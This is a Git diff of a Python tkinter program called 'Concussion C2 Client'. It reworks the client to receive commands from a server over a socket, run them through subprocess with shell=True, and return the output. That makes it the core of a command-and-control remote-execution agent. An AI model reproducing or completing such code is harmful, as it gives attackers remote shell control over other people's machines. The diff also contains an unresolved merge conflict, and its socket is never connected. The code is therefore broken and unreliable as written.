@@ -1,66 +1,42 @@
 import tkinter as tk
 import socket
 import threading
-import argparse
-
-# Create an argument parser to specify server IP and port
-parser = argparse.ArgumentParser(description="Concussion C2 Client")
-parser.add_argument('--server-ip', default='127.0.0.1', help="Server IP")
-parser.add_argument('--server-port', type=int, default=2222, help="Server port")
-args = parser.parse_args()
-
-# Define the server's IP address and port
-SERVER_IP = args.server_ip
-SERVER_PORT = args.server_port
+import subprocess
 
 # Create the main application window
 root = tk.Tk()
 root.title("Concussion C2 Client")
-root.geometry("700x500")  # Adjust the window size as needed
+root.geometry("700x500")
 
 # Define the common color scheme
 root.configure(bg="#000046")
 
-def update_connection_status(status):
-    connection_status_label.config(text=f"Connection Status: {status}")
+# Create a socket for the client
+client_socket = None  # Initialize the client socket
 
-# Function to handle the send command button click
-def send_command():
+# Function to update the response label
+def update_response(message):
+    response_label.config(text=message)
+
+# Function to handle commands from the server
+def handle_command(command):
     try:
-        command = command_var.get()
-        if command:
-            if command.startswith("redirect"):
-                # Handle a redirect command
-                redirect_command, target_ip, target_port = command.split(' ')
-                handle_redirect(target_ip, int(target_port))
-                update_status(f"Redirected to {target_ip}:{target_port}.")
-            else:
-                send_request(command)
+        result = execute_command(command)
+        update_response(result)
 
-            # Update connection status
-            update_connection_status("Connected to Server")
-
-    except ConnectionRefusedError:
-        update_status("Connection refused. Ensure the server is running and the IP/port are correct.")
-        update_connection_status("Connection Refused")
+        # Send the result back to the server
+        send_response_to_server(result)
 
     except Exception as e:
-        print(f"Error: {e}")
-        update_status(f"Error: {e}")
-        update_connection_status("Error Occurred")
+        update_response(f"Error: {e}")
 
-# Function to handle a redirect command
-def handle_redirect(target_ip, target_port):
-    global redirect_target
-    redirect_target = (target_ip, target_port)
-
-# Function to send a request to the server
-def send_request(request):
+def execute_command(command):
     try:
-        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        client_socket.connect((SERVER_IP, SERVER_PORT))
-        client_socket.send(request.encode('utf-8'))
+        # Use subprocess to run the command with administrative privileges
+        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        output, error = process.communicate()
 
+<<<<<<< HEAD
         response_data = client_socket.recv(1024).decode('utf-8')
         response_label.config(text=response_data)
 
@@ -68,27 +44,53 @@ def send_request(request):
 
         # Update connection status when successfully connected
         update_connection_status("Connected to Server")
+=======
+        # Check if the command was successful
+        if process.returncode == 0:
+            return f"Command executed successfully:\n\n{output.decode('utf-8')}"
+        else:
+            return f"Command failed with error:\n\n{error.decode('utf-8')}"
+>>>>>>> b159a6c (fixed display)
 
     except Exception as e:
-        print(f"Error: {e}")
-        update_status(f"Error: {e}")
-        update_connection_status("Error Occurred")
+        return f"Error: {e}"
 
-# Add Labels and Headings (unchanged)
+def send_response_to_server(response):
+    try:
+        if client_socket is not None:
+            # Send the response to the server
+            client_socket.send(response.encode('utf-8'))
+
+    except Exception as e:
+        update_response(f"Error sending response to server: {e}")
+
+# Function to listen for commands from the server
+def listen_for_commands():
+    try:
+        while True:
+            if client_socket is not None:
+                command = client_socket.recv(1024).decode('utf-8')
+                if not command:
+                    break
+
+                handle_command(command)
+
+    except Exception as e:
+        update_response(f"Error: {e}")
+
+# Labels and Heading (unchanged)
 main_heading = tk.Label(root, text="Concussion C2 Client", font=("Helvetica", 16, "bold"), bg="#000046", fg="#00C8FF")
 main_heading.pack(pady=(20, 10))
 
-# Create a label for the server connection status
 status_label = tk.Label(root, text="Connection Status: Not Connected", font=("Helvetica", 16, "bold"), bg="#000046", fg="#41E67B")
 status_label.pack(padx=10, pady=10)
 
-# Create a label for the response
 response_label = tk.Label(root, text="", font=("Helvetica", 14), bg="#000046", fg="#00C8FF")
 response_label.pack(padx=10, pady=10)
 
-# Enhance Button Styling (unchanged)
-send_button = tk.Button(root, text="Send Command",font=("Helvetica", 16, "bold"), bg="#00FFEA", fg="#0000A2", command=send_command)
-send_button.pack()
+# Start listening for commands in a separate thread
+command_listener_thread = threading.Thread(target=listen_for_commands)
+command_listener_thread.start()
 
 # Run the GUI application
 root.mainloop()
